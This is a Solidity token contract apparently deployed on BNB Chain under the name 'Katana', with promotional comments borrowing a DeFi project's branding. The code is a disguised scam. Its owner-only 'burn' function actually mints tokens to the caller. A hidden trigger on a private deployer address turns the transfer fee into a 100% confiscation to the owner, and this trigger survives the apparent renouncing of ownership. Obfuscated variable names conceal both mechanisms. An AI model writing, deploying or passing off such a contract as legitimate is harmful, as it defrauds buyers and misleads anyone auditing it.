/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Katana
 Earn the best risk-adjusted yields on your crypto at 
Ignition Hackathon Grand Prize Winner
 We are thrilled to announce Katana Treasury: a full stack solution for yield generation, risk management, 
 and analytics built specifically for DAOs!
💸 Customizable, risk-adjusted yield generation 
🔰 Downside risk management 
   Increased transparency + insights
    https://app.katana.so 
    https://discord.gg/zsPjtdTSPq
    https://twitter.com/Katana_HQ

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.8.5;
contract Katana {
uint256 public  NOIDwD = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  MmRVCg = 10000000000000000;
uint256 private  EiOMQp = 10000000000000;
uint256 public  uRHCuh = 100000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  gagnBa = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  CJmFij = address(0);
uint8 public constant decimals = 18;
address public  JyLYYH = address(0);
address private  xjAgFh = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  gQYWFH = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  jgQDEn = 100000000000000000000000;
address public owner;
address public  FObNkZ = address(0);
mapping (address => uint256) public balanceOf;
address public  NIHmtz = address(0);
uint256 public  WAuQww = 100000000000000000000000;
uint256 public  mQBtZZ = 10000000000000000000000000000;
uint256 public  KNyefy = 10000000000000000000;
string public  symbol = "Katana";
string public  name = "Katana";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  XOdXli = 100000000000000000;
uint256 public constant ERHHuQ = 9+1;
constructor () {
xjAgFh = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "EuTNID");
require(to != address(0), "EuTNID");
require(amount <= balanceOf[from], "EuTNID");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ERHHuQ/EiOMQp ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==xjAgFh){
EiOMQp = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}